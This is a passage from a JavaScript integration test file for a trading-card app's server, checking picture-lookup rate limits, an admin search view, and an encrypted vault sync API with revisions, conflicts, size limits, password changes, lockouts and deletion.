    const key = VAULT_KEYS[1];
    for (let i = 1; i <= 60; i++) assert.equal((await pic(`Pokémon TCG: Test Tin Number ${i}`, key)).status, 200, "ask " + i);
    const r = await pic("Pokémon TCG: Test Tin Number 61", key);
    assert.equal(r.status, 429); assert.equal(r.headers.get("access-control-allow-origin"), "*");
    assert.equal((await pic("Pokémon TCG: Test Tin Number 3", key)).status, 200, "what's kept still answers");
    assert.equal((await pic("Pokémon TCG: Test Tin Number 62", GH_KEY)).status, 200, "other licenses aren't affected");
  });
  await test("pictures: the admin view shows the words, the groups searched and what fit", async () => {
    assert.equal((await fetch(BASE + "/admin/pictures?q=x")).status, 401);
    const tr = await (await admin("/admin/pictures?q=" + encodeURIComponent("Pokémon TCG: Mega Evolution—Delta Reign Pokémon Center Elite Trainer Box"))).json();
    assert.deepEqual(tr.words, ["s_me", "delta", "reign", "pkc", "etb"]);
    assert.equal(tr.cached.product_id, 712104);
    assert.ok(tr.groups.includes("ME03: Delta Reign"));
    assert.deepEqual(tr.fits.map((f) => f.id), [712104]);
    assert.equal(tr.result.product.id, 712104);
  });

  console.log("\nWeb version and sync: vault storage");
  await startWorker("vault", APPROVAL_PORT + 2, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", "VAULT_LOCK_MS=3000", "VAULT_MIN_GAP_MS=300"]);
  const [V1, V2] = VAULT_KEYS;
  const b64 = (n) => Buffer.from(crypto.getRandomValues(new Uint8Array(n))).toString("base64");
  const tok = () => Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64url");
  // A record shaped like the app's: a big random "ciphertext" stands in for the sealed vault.
  const sealed = (salt, ctBytes = 2000, iter = 600000) => ({ format: "orbit-sync", v: 1, z: "gzip", kdf: "PBKDF2-SHA256", iter, salt, iv: b64(12), ct: Buffer.from(crypto.getRandomValues(new Uint8Array(Math.min(ctBytes, 65536)))).toString("base64").repeat(Math.ceil(ctBytes / 65536)), savedAt: new Date().toISOString() });
  const vault = (path, key, { method = "GET", auth, newAuth, record, salt, iter = 600000, raw } = {}) => fetch(BASE + path, { method,
    headers: { ...(key ? { authorization: "Bearer " + key } : {}), ...(auth ? { "x-vault-auth": auth } : {}), ...(newAuth ? { "x-vault-new-auth": newAuth } : {}),
      ...(record || raw ? { "content-type": "application/json", "x-vault-salt": salt || (record && record.salt) || "", "x-vault-iter": String(iter) } : {}) },
    body: raw != null ? raw : record ? JSON.stringify(record) : undefined });
  const wait = (ms) => new Promise((ok) => setTimeout(ok, ms));
  const salt1 = b64(16), token1 = tok();
  let rec1, created1;
  await test("no vault yet: info says so, and a bad or missing license is refused", async () => {
    assert.deepEqual(await (await vault("/vault/info", V1)).json(), { exists: false });
    assert.equal((await vault("/vault/info", "PVLT-NOPE-NOPE-NOPE-NOPE")).status, 401);
    assert.equal((await vault("/vault/info")).status, 401);
    assert.equal((await vault("/vault", V1, { auth: token1 })).status, 404);
  });
  await test("the first save creates it (revision 1), and info gives what a new device needs", async () => {
    rec1 = sealed(salt1);
    const made = await (await vault("/vault?base=0&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: rec1 })).json();
    assert.equal(made.rev, 1); assert.ok(Math.abs(Date.now() - made.created) < 60000, "created says when (the vault's id)");
    created1 = made.created;
    const info = await (await vault("/vault/info", V1.toLowerCase())).json();
    assert.equal(info.exists, true); assert.equal(info.rev, 1); assert.equal(info.created, created1); assert.equal(info.salt, salt1); assert.equal(info.iter, 600000);
    assert.equal(info.device, "Desktop app"); assert.equal(info.size, JSON.stringify(rec1).length); assert.ok(Date.now() - info.updatedAt < 60000);
  });
  await test("reading it back takes the token, and returns exactly what was sent", async () => {
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 1); assert.equal(r.created, created1); assert.equal(r.device, "Desktop app"); assert.deepEqual(r.record, rec1);
    assert.deepEqual(await (await vault("/vault?have=1", V1, { auth: token1 })).json(), { rev: 1, created: created1, same: true });
    assert.equal((await vault("/vault", V1)).status, 403, "no token");
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "wrong token");
    assert.equal((await vault("/vault", V2, { auth: token1 })).status, 404, "another license has its own (none yet)");
  });
  await test("a save names the revision it started from; a stale one gets 409 with the current revision", async () => {
    await wait(350);
    const rec2 = sealed(salt1);
    assert.deepEqual(await (await vault(`/vault?base=1&vid=${created1}&device=Web`, V1, { method: "PUT", auth: token1, record: rec2 })).json(), { rev: 2, created: created1 });
    const stale = await vault("/vault?base=1&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(stale.status, 409); assert.deepEqual(await stale.json(), { error: "changed on another device", rev: 2, created: created1 });
    const again = await vault("/vault?base=0", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(again.status, 409, "creating again isn't allowed once it exists");
    const r = await (await vault("/vault?have=1", V1, { auth: token1 })).json();
    assert.equal(r.rev, 2); assert.deepEqual(r.record, rec2); assert.equal(r.device, "Web");
  });
  await test("saves closer than the minimum gap are turned away", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=2", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 200);
    assert.equal((await vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 429);
  });
  await test("a save that names another vault (one deleted and made again) gets 409, even on the same revision", async () => {
    await wait(350);
    const r = await vault(`/vault?base=3&vid=${created1 - 1}`, V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "changed on another device", rev: 3, created: created1 });
  });
  await test("two devices saving at once from the same revision: one wins, the other gets 409", async () => {
    await wait(350);
    const [a, b] = await Promise.all([1, 2].map(() => vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1, 300000) })));
    assert.deepEqual([a.status, b.status].sort(), [200, 409]);
    const info = await (await vault("/vault/info", V1)).json();
    assert.equal(info.rev, 4);
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 4); assert.ok(r.record.ct.length > 300000, "the winner's record is whole");
  });
  await test("a vault of several megabytes goes in chunks and comes back whole; over 8 million characters is refused", async () => {
    await wait(350);
    const big = sealed(salt1, 3_000_000);
    assert.deepEqual(await (await vault("/vault?base=4", V1, { method: "PUT", auth: token1, record: big })).json(), { rev: 5, created: created1 });
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 5); assert.equal(r.record.ct, big.ct);
    await wait(350);
    const huge = sealed(salt1, 6_200_000);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: huge })).status, 413);
  });
  await test("only a sealed record sealed with the salt it names is taken", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, raw: '{"hello":"world"}', salt: salt1 })).status, 400);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(b64(16)), salt: salt1 })).status, 400, "salt header doesn't match the record");
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: "short", record: sealed(salt1) })).status, 400);
    assert.equal((await vault("/vault?base=x", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 400);
  });
  const salt2 = b64(16), token2 = tok();
  await test("a new password: the record on a new salt needs the new token, then only the new token works", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(salt2) })).status, 400, "no new token");
    assert.deepEqual(await (await vault("/vault?base=5", V1, { method: "PUT", auth: token1, newAuth: token2, record: sealed(salt2) })).json(), { rev: 6, created: created1 });
    const old = await vault("/vault", V1, { auth: token1 });
    assert.equal(old.status, 403); assert.equal((await old.json()).error, "password changed", "the old password is recognized as the old one");
    assert.equal((await (await vault("/vault", V1, { auth: token2 })).json()).rev, 6);
    assert.equal((await (await vault("/vault/info", V1)).json()).salt, salt2);
  });
  await test("a device still on the previous password never locks the vault, however often it tries", async () => {
    for (let i = 0; i < 12; i++) assert.equal((await vault("/vault", V1, { auth: token1 })).status, 403);
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
  await test("10 wrong passwords lock the vault for a while, even for the right one; it opens again after", async () => {
    for (let i = 0; i < 10; i++) assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403);
    const locked = await vault("/vault", V1, { auth: token2 });
    assert.equal(locked.status, 429); assert.ok((await locked.json()).retryAfter >= 1);
    assert.equal((await vault("/vault?base=6", V1, { method: "PUT", auth: token2, record: sealed(salt2) })).status, 429, "saving too");
    await wait(3200);   // VAULT_LOCK_MS is 3000 here
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "the count started over");
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
  await test("browsers can call it: the preflight allows PUT, DELETE and the vault headers", async () => {
    const r = await fetch(BASE + "/vault", { method: "OPTIONS" });
    assert.equal(r.status, 204);
    assert.match(r.headers.get("access-control-allow-methods"), /PUT/); assert.match(r.headers.get("access-control-allow-methods"), /DELETE/);
    for (const h of ["x-vault-auth", "x-vault-new-auth", "x-vault-salt", "x-vault-iter", "authorization"]) assert.match(r.headers.get("access-control-allow-headers"), new RegExp(h));
    assert.equal((await vault("/vault/info", V1)).headers.get("access-control-allow-origin"), "*");
  });
  await test("the owner sees whose vaults there are and how big, never what's in them", async () => {
    await vault("/vault?base=0&device=Web", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) });
    const d = await (await admin("/admin/vaults")).json();
    assert.equal(d.vaults.length, 2);
    const v = d.vaults.find((x) => x.rev === 6);
    assert.ok(v && v.size > 0 && typeof v.device === "string" && v.license.length === 12 && !("record" in v) && !JSON.stringify(d).includes(salt2));
    assert.equal(d.vaults.find((x) => x.rev === 1).device, "Web");
    assert.equal((await fetch(BASE + "/admin/vaults")).status, 401);
  });
  await test("deleting takes the license key alone (a forgotten password), and the devices can start over", async () => {
    assert.deepEqual(await (await vault("/vault", V2, { method: "DELETE" })).json(), { ok: true, deleted: true });
    assert.deepEqual(await (await vault("/vault/info", V2)).json(), { exists: false });
    assert.equal((await vault("/vault", "PVLT-NOPE-NOPE-NOPE-NOPE", { method: "DELETE" })).status, 401);
    const before = (await (await vault("/vault/info", V1)).json()).created;
    const again = await (await vault("/vault?base=0", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) })).json();
    assert.equal(again.rev, 1); assert.ok(again.created > 0);
    assert.equal(before, created1, "the other license's vault keeps its id");
  });
  console.log(`\n${passed} passed`);
} finally {
  for (const w of workers) stopWorker(w);
  discord.close();
  // Windows can hold on to the database files for a few seconds after the workers stop.
  for (let i = 0; i < 20; i++) {
    try { rmSync(tmp, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 }); break; }
    catch { await new Promise((r) => setTimeout(r, 500)); }
  }
}
